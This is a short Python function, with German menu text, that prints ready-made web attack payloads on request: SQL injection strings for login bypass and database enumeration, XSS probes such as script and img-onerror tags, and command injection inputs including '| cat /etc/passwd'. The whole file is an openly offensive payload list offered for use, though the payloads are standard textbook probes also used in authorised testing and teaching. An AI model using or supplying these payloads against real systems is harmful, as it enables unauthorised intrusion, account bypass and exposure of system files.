def generate_payloads():
    print("\n[🔧 Wähle Payload-Typ:]")
    print("1: SQL-Injection")
    print("2: XSS")
    print("3: Command Injection")
    
    choice = input(">>> ")
    
    if choice == "1":
        print("\n=== SQLi Payloads ===")
        print("Login-Bypass: ' OR '1'='1'--")
        print("DB-Info: ' UNION SELECT 1,@@version,3--")
        print("Tabellen: ' UNION SELECT 1,table_name,3 FROM information_schema.tables--")
    
    elif choice == "2":
        print("\n=== XSS Payloads ===")
        print("<script>alert('XSS')</script>")
        print("<img src=x onerror=alert(1)>")
        print("${alert(1)}")
    
    elif choice == "3":
        print("\n=== Command Injection ===")
        print("; ls -la /")
        print("| cat /etc/passwd")
        print("`id`")
